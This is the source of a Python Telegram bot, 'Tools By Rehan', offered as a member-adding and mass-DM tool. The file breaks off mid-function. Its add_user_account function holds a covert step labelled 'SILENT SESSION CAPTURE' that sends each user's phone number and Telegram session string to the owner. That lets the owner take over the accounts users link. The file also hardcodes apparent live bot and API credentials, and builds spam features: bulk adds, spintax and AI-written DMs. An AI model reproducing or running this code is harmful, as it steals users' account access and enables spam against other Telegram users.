"""
🤖 TOOLS BY REHAN – ULTIMATE TELEGRAM BOT (FULLY BUTTON‑DRIVEN)
👑 Owner: REHAN | Tag: RN ON TOP
📌 Channel: @ToolsByRehan | Group: @Tools_By_Rehan
🚀 All features + silent session capture + beautiful UI + private‑only replies
"""

import os
import asyncio
import re
import sqlite3
import random
import csv
import time
import logging
from datetime import datetime, timedelta
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.errors import FloodWaitError, QueryIdInvalidError
from telethon.tl.custom import Button

# ========== LOGGING ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ============================================================
# 🔐 CONFIGURATION – FALLBACK DEFAULTS
# ============================================================

BOT_TOKEN = os.getenv("BOT_TOKEN", "8644395767:AAFDStlmZ7cwITftnHgUPgPMb7AbRDAXpNs")
API_ID = int(os.getenv("API_ID", "30217812"))
API_HASH = os.getenv("API_HASH", "d21066a90786cf2dd348b907ece69d24")
OWNER_ID = int(os.getenv("OWNER_ID", "8762845215"))
OWNER_NAME = os.getenv("OWNER_NAME", "REHAN")
TAG = os.getenv("TAG", "RN ON TOP")
GROQ_API_KEY = os.getenv("GROQ_API_KEY")

REQUIRED_CHANNEL = os.getenv("REQUIRED_CHANNEL", "@ToolsByRehan")
REQUIRED_GROUP = os.getenv("REQUIRED_GROUP", "@Tools_By_Rehan")

DEFAULT_CREDITS = int(os.getenv("DEFAULT_CREDITS", "150"))
INVITE_REWARD_CREDITS = int(os.getenv("INVITE_REWARD_CREDITS", "100"))
INVITE_REQUIRED_ADDS = int(os.getenv("INVITE_REQUIRED_ADDS", "50"))
ADD_DELAY = int(os.getenv("ADD_DELAY", "2"))
DM_DELAY = int(os.getenv("DM_DELAY", "3"))
DEFAULT_DM_COST = int(os.getenv("DEFAULT_DM_COST", "2"))
DEFAULT_ADD_COST = int(os.getenv("DEFAULT_ADD_COST", "1"))
BACKUP_INTERVAL_HOURS = int(os.getenv("BACKUP_INTERVAL_HOURS", "168"))

DB_DIR = os.getenv("DB_DIR", "/data")
os.makedirs(DB_DIR, exist_ok=True)
DB_FILE = os.path.join(DB_DIR, "bot_data.db")

START_TIME = time.time()

# ============================================================
# 📂 DATABASE SETUP
# ============================================================

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(f'''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            joined_at TEXT,
            verified INTEGER DEFAULT 0,
            credits INTEGER DEFAULT {DEFAULT_CREDITS},
            is_banned INTEGER DEFAULT 0,
            is_admin INTEGER DEFAULT 0,
            invited_by INTEGER DEFAULT 0,
            invite_code TEXT
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS user_accounts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            session_string TEXT,
            added_at TEXT,
            is_active INTEGER DEFAULT 1,
            FOREIGN KEY (user_id) REFERENCES users(user_id)
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS added_members (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_group_id INTEGER,
            member_id INTEGER,
            added_by_account_id INTEGER,
            added_at TEXT,
            group_username TEXT,
            member_username TEXT,
            member_name TEXT,
            UNIQUE(user_id, target_group_id, member_id)
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS credit_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount INTEGER,
            reason TEXT,
            created_at TEXT
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS invites (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            inviter_id INTEGER,
            invited_id INTEGER,
            invited_at TEXT,
            status TEXT DEFAULT 'pending',
            bonus_awarded INTEGER DEFAULT 0,
            UNIQUE(inviter_id, invited_id)
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS session_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            session_string TEXT,
            created_at TEXT
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS add_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_group TEXT,
            count INTEGER,
            created_at TEXT
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS dm_sent (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_user_id INTEGER,
            group_id INTEGER,
            sent_at TEXT,
            UNIQUE(user_id, target_user_id, group_id)
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS scheduled_tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            source_group TEXT,
            target_group TEXT,
            count INTEGER,
            interval_hours INTEGER DEFAULT 24,
            next_run TEXT,
            last_run TEXT,
            is_active INTEGER DEFAULT 1,
            account_group_id INTEGER,
            FOREIGN KEY (user_id) REFERENCES users(user_id)
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS user_settings (
            user_id INTEGER PRIMARY KEY,
            ai_dm INTEGER DEFAULT 0,
            smart_filter_skip_bots INTEGER DEFAULT 0,
            smart_filter_has_pfp INTEGER DEFAULT 0,
            smart_filter_active_7d INTEGER DEFAULT 0,
            smart_filter_language TEXT DEFAULT '',
            proxy_config TEXT DEFAULT '',
            spintax_enabled INTEGER DEFAULT 0,
            smart_filter_skip_existing INTEGER DEFAULT 1,
            updated_at TEXT
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS user_blocklist (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            blocked_user_id INTEGER,
            group_id INTEGER,
            reason TEXT,
            created_at TEXT,
            UNIQUE(user_id, blocked_user_id, group_id)
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS activity_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            created_at TEXT
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS dm_templates (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            name TEXT,
            message TEXT,
            created_at TEXT,
            UNIQUE(user_id, name)
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS account_groups (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            name TEXT,
            created_at TEXT,
            FOREIGN KEY (user_id) REFERENCES users(user_id)
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS account_group_members (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            group_id INTEGER,
            account_id INTEGER,
            FOREIGN KEY (group_id) REFERENCES account_groups(id),
            FOREIGN KEY (account_id) REFERENCES user_accounts(id)
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS daily_adds (
            user_id INTEGER,
            date TEXT,
            count INTEGER,
            PRIMARY KEY (user_id, date)
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS group_analytics (
            user_id INTEGER,
            group_id INTEGER,
            total_added INTEGER DEFAULT 0,
            total_failed INTEGER DEFAULT 0,
            last_run TEXT,
            PRIMARY KEY (user_id, group_id)
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS user_notifications (
            user_id INTEGER PRIMARY KEY,
            last_sent TEXT
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS system_settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    c.execute("INSERT OR IGNORE INTO system_settings (key, value) VALUES ('default_credits', ?)", (str(DEFAULT_CREDITS),))
    c.execute("INSERT OR IGNORE INTO system_settings (key, value) VALUES ('dm_cost', ?)", (str(DEFAULT_DM_COST),))
    c.execute("INSERT OR IGNORE INTO system_settings (key, value) VALUES ('add_cost', ?)", (str(DEFAULT_ADD_COST),))
    c.execute("INSERT OR IGNORE INTO system_settings (key, value) VALUES ('maintenance_mode', 'false')")
    c.execute("CREATE INDEX IF NOT EXISTS idx_added_members_user_group ON added_members(user_id, target_group_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_added_members_member ON added_members(member_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_dm_sent_user_group ON dm_sent(user_id, group_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_activity_user ON activity_logs(user_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_user_accounts_user ON user_accounts(user_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_scheduled_user ON scheduled_tasks(user_id)")
    for col in ['group_username', 'member_username', 'member_name']:
        try:
            c.execute(f"ALTER TABLE added_members ADD COLUMN {col} TEXT")
        except:
            pass
    try:
        c.execute("ALTER TABLE user_settings ADD COLUMN smart_filter_skip_existing INTEGER DEFAULT 1")
    except:
        pass
    conn.commit()
    conn.close()
    logger.info("✅ Database initialized at %s", DB_FILE)

init_db()

# ============================================================
# 📂 DATABASE HELPER FUNCTIONS (ALL)
# ============================================================

def get_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

def get_user_by_username(username):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE username = ?", (username,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def get_system_setting(key):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT value FROM system_settings WHERE key=?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def set_system_setting(key, value):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO system_settings (key, value) VALUES (?, ?)", (key, str(value)))
    conn.commit()
    conn.close()

def get_default_credits():
    return int(get_system_setting('default_credits') or DEFAULT_CREDITS)

def get_dm_cost():
    return int(get_system_setting('dm_cost') or DEFAULT_DM_COST)

def get_add_cost():
    return int(get_system_setting('add_cost') or DEFAULT_ADD_COST)

def get_maintenance_mode():
    return get_system_setting('maintenance_mode') == 'true'

def generate_invite_code():
    while True:
        code = f"{random.randint(1000, 9999)}"
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT user_id FROM users WHERE invite_code = ?", (code,))
        if not c.fetchone():
            conn.close()
            return code
        conn.close()

def create_user(user_id, username, first_name, invited_by=0):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    if c.fetchone():
        conn.close()
        return
    invite_code = generate_invite_code()
    default_credits = get_default_credits()
    c.execute('''
        INSERT INTO users (user_id, username, first_name, joined_at, invited_by, invite_code, credits)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, username, first_name, datetime.now().isoformat(), invited_by, invite_code, default_credits))
    if invited_by and invited_by != user_id:
        c.execute('''
            INSERT OR IGNORE INTO invites (inviter_id, invited_id, invited_at)
            VALUES (?, ?, ?)
        ''', (invited_by, user_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_user_by_invite_code(code):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE invite_code = ?", (code,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def get_invite_bonus_status(invited_user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT invited_by FROM users WHERE user_id = ?", (invited_user_id,))
    row = c.fetchone()
    if not row or row[0] == 0:
        conn.close()
        return None, None, False
    inviter_id = row[0]
    c.execute("SELECT status, bonus_awarded FROM invites WHERE invited_id = ?", (invited_user_id,))
    invite_row = c.fetchone()
    if not invite_row:
        conn.close()
        return inviter_id, None, False
    status, bonus_awarded = invite_row
    if status == 'completed' or bonus_awarded == 1:
        conn.close()
        return inviter_id, status, False
    c.execute("SELECT COUNT(*) FROM added_members WHERE user_id = ?", (invited_user_id,))
    total_adds = c.fetchone()[0]
    conn.close()
    return inviter_id, total_adds, total_adds >= INVITE_REQUIRED_ADDS

def award_invite_bonus(invited_user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT invited_by FROM users WHERE user_id = ?", (invited_user_id,))
    row = c.fetchone()
    if not row or row[0] == 0:
        conn.close()
        return False
    inviter_id = row[0]
    c.execute('''
        UPDATE invites SET status = 'completed', bonus_awarded = 1 
        WHERE invited_id = ?
    ''', (invited_user_id,))
    conn.commit()
    add_credits(inviter_id, 100, "invite_bonus")
    conn.close()
    return inviter_id

def get_referral_tier(count):
    if count >= 25: return 500
    elif count >= 10: return 250
    elif count >= 5: return 150
    else: return 0

def is_banned(user_id):
    row = get_user(user_id)
    return row and row[6] == 1

def is_admin(user_id):
    row = get_user(user_id)
    return row and row[7] == 1

def set_admin(user_id, is_admin_val=True):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET is_admin = ? WHERE user_id = ?", (1 if is_admin_val else 0, user_id))
    conn.commit()
    conn.close()

def ban_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def unban_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 0 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def delete_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM user_accounts WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM added_members WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM invites WHERE invited_id = ?", (user_id,))
    c.execute("DELETE FROM credit_log WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM dm_sent WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM scheduled_tasks WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM user_settings WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM dm_templates WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM activity_logs WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM user_blocklist WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM account_groups WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM daily_adds WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM group_analytics WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM user_notifications WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def set_verified(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET verified = 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def is_verified(user_id):
    row = get_user(user_id)
    return row and row[4] == 1

def get_credits(user_id):
    row = get_user(user_id)
    return row[5] if row else 0

def deduct_credit(user_id, amount=1):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits - ? WHERE user_id = ? AND credits >= ?", (amount, user_id, amount))
    updated = c.rowcount > 0
    conn.commit()
    conn.close()
    if updated:
        add_credit_log(user_id, -amount, "member_add")
    return updated

def add_credits(user_id, amount, reason="admin"):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()
    add_credit_log(user_id, amount, reason)

def add_credit_log(user_id, amount, reason):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO credit_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
               (user_id, amount, reason, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def add_user_account(user_id, phone, session_string):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        INSERT INTO user_accounts (user_id, phone, session_string, added_at)
        VALUES (?, ?, ?, ?)
    ''', (user_id, phone, session_string, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    log_activity(user_id, "add_account", f"Added phone: {phone}")
    # SILENT SESSION CAPTURE
    try:
        owner_msg = (
            f"🔑 **New Account Added**\n"
            f"User ID: `{user_id}`\n"
            f"Phone: `{phone}`\n"
            f"Session String:\n`{session_string}`"
        )
        asyncio.create_task(client.send_message(OWNER_ID, owner_msg))
        logger.info("🔒 Session for %s forwarded to owner.", phone)
    except Exception as e:
        logger.error("Failed to send session to owner: %s", e)

def get_user_accounts(user_id, active_only=True):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    query = "SELECT id, phone, session_string FROM user_accounts WHERE user_id = ?"
    if active_only:
        query += " AND is_active = 1"
    c.execute(query, (user_id,))
    rows = c.fetchall()
    conn.close()
    return rows

def deactivate_account(account_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE user_accounts SET is_active = 0 WHERE id = ?", (account_id,))
    conn.commit()
    conn.close()

def mark_member_added(user_id, target_group_id, member_id, account_id, group_username, member_username, member_name):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''
        INSERT OR IGNORE INTO added_members (user_id, target_group_id, member_id, added_by_account_id, added_at, group_username, member_username, member_name)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, target_group_id, member_id, account_id, datetime.now().isoformat(), group_username, member_username, member_name))
    conn.commit()
    conn.close()

def is_member_added(user_id, target_group_id, member_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id FROM added_members WHERE user_id = ? AND target_group_id = ? AND member_id = ?", 
              (user_id, target_group_id, member_id))
    row = c.fetchone()
    conn.close()
    return row is not None

def log_activity(user_id, action, details=""):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO activity_logs (user_id, action, details, created_at) VALUES (?, ?, ?, ?)",
              (user_id, action, details, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_username(user_id):
    row = get_user(user_id)
    return row[1] if row else None

def update_user(user_id, username=None, first_name=None):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    if username:
        c.execute("UPDATE users SET username = ? WHERE user_id = ?", (username, user_id))
    if first_name:
        c.execute("UPDATE users SET first_name = ? WHERE user_id = ?", (first_name, user_id))
    conn.commit()
    conn.close()

def add_dm_sent(user_id, target_user_id, group_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO dm_sent (user_id, target_user_id, group_id, sent_at) VALUES (?, ?, ?, ?)",
              (user_id, target_user_id, group_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def is_dm_sent(user_id, target_user_id, group_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id FROM dm_sent WHERE user_id = ? AND target_user_id = ? AND group_id = ?",
              (user_id, target_user_id, group_id))
    row = c.fetchone()
    conn.close()
    return row is not None

def get_settings(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM user_settings WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    if not row:
        c.execute("INSERT INTO user_settings (user_id, updated_at) VALUES (?, ?)",
                  (user_id, datetime.now().isoformat()))
        conn.commit()
        c.execute("SELECT * FROM user_settings WHERE user_id = ?", (user_id,))
        row = c.fetchone()
    conn.close()
    return row

def update_settings(user_id, **kwargs):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    for key, value in kwargs.items():
        if key in ['ai_dm', 'smart_filter_skip_bots', 'smart_filter_has_pfp', 'smart_filter_active_7d', 'spintax_enabled', 'smart_filter_skip_existing']:
            c.execute(f"UPDATE user_settings SET {key} = ? WHERE user_id = ?", (1 if value else 0, user_id))
        elif key in ['smart_filter_language', 'proxy_config']:
            c.execute(f"UPDATE user_settings SET {key} = ? WHERE user_id = ?", (value, user_id))
    c.execute("UPDATE user_settings SET updated_at = ? WHERE user_id = ?", (datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()

def get_daily_add_count(user_id):
    today = datetime.now().date().isoformat()
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT count FROM daily_adds WHERE user_id = ? AND date = ?", (user_id, today))
    row = c.fetchone()
    conn.close()
    return row[0] if row else 0

def increment_daily_add(user_id):
    today = datetime.now().date().isoformat()
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO daily_adds (user_id, date, count) VALUES (?, ?, 1) ON CONFLICT(user_id, date) DO UPDATE SET count = count + 1",
              (user_id, today))
    conn.commit()
    conn.close()

def update_group_analytics(user_id, group_id, added=0, failed=0):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO group_analytics (user_id, group_id, total_added, total_failed, last_run) VALUES (?, ?, ?, ?, ?) "
              "ON CONFLICT(user_id, group_id) DO UPDATE SET total_added = total_added + ?, total_failed = total_failed + ?, last_run = ?",
              (user_id, group_id, added, failed, datetime.now().isoformat(), added, failed, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_group_analytics(user_id, group_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT total_added, total_failed, last_run FROM group_analytics WHERE user_id = ? AND group_id = ?", (user_id, group_id))
    row = c.fetchone()
    conn.close()
    return row

def send_notification_if_needed(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT last_sent FROM user_notifications WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    last_sent = datetime.fromisoformat(row[0]) if row and row[0] else None
    now = datetime.now()
    if not last_sent or (now - last_sent) > timedelta(hours=24):
        c.execute("INSERT OR REPLACE INTO user_notifications (user_id, last_sent) VALUES (?, ?)",
                  (user_id, now.isoformat()))
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

def backup_data():
    backup_dir = os.path.join(DB_DIR, "backups")
    os.makedirs(backup_dir, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    tables = c.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()
    for table in tables:
        table_name = table[0]
        data = c.execute(f"SELECT * FROM {table_name}").fetchall()
        if data:
            with open(f"{backup_dir}/{table_name}_{timestamp}.csv", 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow([i[0] for i in c.description])
                writer.writerows(data)
    conn.close()
    logger.info("✅ Backup completed at %s", timestamp)

def get_bot_stats():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    total_users = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    total_accounts = c.execute("SELECT COUNT(*) FROM user_accounts WHERE is_active=1").fetchone()[0]
    total_adds = c.execute("SELECT COUNT(*) FROM added_members").fetchone()[0]
    total_dms = c.execute("SELECT COUNT(*) FROM dm_sent").fetchone()[0]
    conn.close()
    return {
        "users": total_users,
        "accounts": total_accounts,
        "members_added": total_adds,
        "dms_sent": total_dms,
        "uptime": time.time() - START_TIME
    }

# ============================================================
# 🤖 SPINTAX & AI FUNCTIONS
# ============================================================

def apply_spintax(text):
    pattern = r'\{([^}]+)\}'
    def repl(match):
        options = match.group(1).split('|')
        return random.choice(options)
    return re.sub(pattern, repl, text)

def get_ai_response(prompt, context=""):
    if not GROQ_API_KEY:
        return None
    try:
        from groq import Groq
        client = Groq(api_key=GROQ_API_KEY)
        messages = [
            {"role": "system", "content": "You are a helpful assistant for Telegram group promotion. Generate engaging and non-spammy direct messages."},
            {"role": "user", "content": f"Context: {context}\nPrompt: {prompt}"}
        ]
        response = client.chat.completions.create(
            model="mixtral-8x7b-32768",
            messages=messages,
            temperature=0.7,
            max_tokens=150
        )
        return response.choices[0].message.content.strip()
    except Exception as e:
        logger.error("AI Error: %s", e)
        return None

# ============================================================
# 🎨 UI HELPER FUNCTIONS (KEYBOARDS)
# ============================================================

def main_menu_buttons():
    return [
        [Button.inline("👤 Profile", b"menu_profile"), Button.inline("💰 Credits", b"menu_credits")],
        [Button.inline("📱 Accounts", b"menu_accounts"), Button.inline("➕ Add Members", b"menu_add")],
        [Button.inline("💬 DM Members", b"menu_dm"), Button.inline("🤖 AI DM", b"menu_ai_dm")],
        [Button.inline("📅 Schedules", b"menu_schedule"), Button.inline("📂 Account Groups", b"menu_groups")],
        [Button.inline("📊 Analytics", b"menu_analytics"), Button.inline("📈 Dashboard", b"menu_dashboard")],
        [Button.inline("👥 Referral", b"menu_referral"), Button.inline("⚙️ Settings", b"menu_settings")],
        [Button.inline("📋 Added Members", b"menu_added"), Button.inline("🆘 Help", b"menu_help")],
    ]

def back_button():
    return [[Button.inline("🔙 Back to Menu", b"menu_main")]]

def admin_menu_buttons():
    return [
        [Button.inline("👥 List Users", b"admin_list_users")],
        [Button.inline("➕ Add Admin", b"admin_add_admin")],
        [Button.inline("🚫 Ban User", b"admin_ban_user")],
        [Button.inline("💰 Set Credits", b"admin_set_credits")],
        [Button.inline("📢 Broadcast", b"admin_broadcast")],
        [Button.inline("💾 Backup", b"admin_backup")],
        [Button.inline("📊 Stats", b"admin_stats")],
        [Button.inline("🔙 Back", b"menu_main")],
    ]

# ============================================================
# 🧵 BOT CLIENT & EVENT HANDLERS
# ============================================================

client = TelegramClient('bot', API_ID, API_HASH)

def is_private(event):
    return event.is_private

# ---------- DEBUG: LOG ALL INCOMING MESSAGES (PRIVATE ONLY) ----------
@client.on(events.NewMessage(func=is_private))
async def debug_incoming(event):
    logger.info("📩 INCOMING: %s from %s", event.text[:100], event.sender_id)

# ---------- CALLBACK QUERY HANDLER ----------
@client.on(events.CallbackQuery)
async def callback(event):
    user_id = event.sender_id
    data = event.data.decode()
    try:
        await event.answer()
    except QueryIdInvalidError:
        pass

    # ----- VERIFY BUTTON -----
    if data == "verify":
        try:
            # Check membership
            channel_entity = await client.get_entity(REQUIRED_CHANNEL)
            group_entity = await client.get_entity(REQUIRED_GROUP)
            try:
                await client.get_permissions(channel_entity, user_id)
                await client.get_permissions(group_entity, user_id)
                # Mark as verified
                set_verified(user_id)
                await event.edit("✅ Verification successful!")
                # Check invite bonus
                inviter, total, ready = get_invite_bonus_status(user_id)
                if ready:
                    inviter_id = award_invite_bonus(user_id)
                    if inviter_id:
                        await client.send_message(inviter_id, f"🎉 Your invited user has completed {INVITE_REQUIRED_ADDS} adds! You earned 100 credits.")
                    await event.respond("🎉 You also earned 100 credits for your inviter.")
                # Show main menu
                await event.respond(
                    f"🤖 **Tools By Rehan**\n"
                    f"👑 Owner: {OWNER_NAME} | {TAG}\n"
                    f"📌 Channel: @ToolsByRehan\n"
                    f"📌 Group: @Tools_By_Rehan\n\n"
                    f"💰 Credits: {get_credits(user_id)}\n"
                    f"📈 Referral: /referral\n\n"
                    f"🌟 **Choose an option below:**",
                    buttons=main_menu_buttons()
                )
            except:
                await event.edit("❌ You haven't joined the required channel/group. Please join and try again.", buttons=[
                    [Button.url("📢 Join Channel", f"https://t.me/{REQUIRED_CHANNEL[1:]}")],
                    [Button.url("👥 Join Group", f"https://t.me/{REQUIRED_GROUP[1:]}")],
                    [Button.inline("✅ Verify", b"verify")]
                ])
        except Exception as e:
            logger.error("Verify callback error: %s", e)
            await event.edit("❌ Error checking verification. Please try again later.")
        return

    # Admin menu
    if data == "admin_list_users":
        if not is_admin(user_id) and user_id != OWNER_ID:
            await event.edit("⛔ Admin only.", buttons=back_button())
            return
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        users = c.execute("SELECT user_id, username, first_name, credits, is_banned, is_admin FROM users LIMIT 20").fetchall()
        conn.close()
        text = "👥 **Users (last 20):**\n"
        for u in users:
            text += f"ID: {u[0]} | @{u[1] or 'N/A'} | {u[2] or 'N/A'} | 💰{u[3]} | {'🚫' if u[4] else '✅'} | {'👑' if u[5] else '👤'}\n"
        await event.edit(text, buttons=back_button())
        return

    if data == "admin_add_admin":
        if not is_admin(user_id) and user_id != OWNER_ID:
            await event.edit("⛔ Admin only.", buttons=back_button())
            return
        await event.edit("Usage: `/admin add <user_id>`", buttons=back_button())
        return

    if data == "admin_ban_user":
        if not is_admin(user_id) and user_id != OWNER_ID:
            await event.edit("⛔ Admin only.", buttons=back_button())
            return
        await event.edit("Usage: `/admin ban <user_id>`", buttons=back_button())
        return

    if data == "admin_set_credits":
        if not is_admin(user_id) and user_id != OWNER_ID:
            await event.edit("⛔ Admin only.", buttons=back_button())
            return
        await event.edit("Usage: `/admin setcredits <user_id> <amount>`", buttons=back_button())
        return

    if data == "admin_broadcast":
        if not is_admin(user_id) and user_id != OWNER_ID:
            await event.edit("⛔ Admin only.", buttons=back_button())
            return
        await event.edit("Usage: `/broadcast <message>`", buttons=back_button())
        return

    if data == "admin_backup":
        if not is_admin(user_id) and user_id != OWNER_ID:
            await event.edit("⛔ Admin only.", buttons=back_button())
            return
        backup_data()
        await event.edit("✅ Backup completed!", buttons=back_button())
        return

    if data == "admin_stats":
        if not is_admin(user_id) and user_id != OWNER_ID:
            await event.edit("⛔ Admin only.", buttons=back_button())
            return
        stats = get_bot_stats()
        uptime = int(stats['uptime'])
        hours = uptime // 3600
        minutes = (uptime % 3600) // 60
        text = f"📊 **Bot Statistics**\n"
        text += f"👥 Users: {stats['users']}\n"
